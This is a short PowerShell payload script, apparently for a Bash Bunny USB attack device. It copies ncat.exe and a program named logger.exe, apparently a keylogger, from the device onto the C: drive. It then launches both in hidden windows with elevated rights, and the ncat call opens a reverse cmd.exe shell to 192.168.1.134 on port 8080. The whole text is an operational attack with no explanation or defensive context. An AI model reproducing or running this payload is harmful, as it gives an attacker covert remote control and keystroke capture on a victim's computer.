cp $((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\logger.exe') c:\logger.exe; 
cp $((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\ncat.exe')  c:\ncat.exe;

Start-Process powershell -windowstyle hidden -Verb runAs "c:\ncat.exe 192.168.1.134 8080 -e cmd.exe";
Start-Process powershell -windowstyle hidden -Verb runAs "c:\logger.exe";
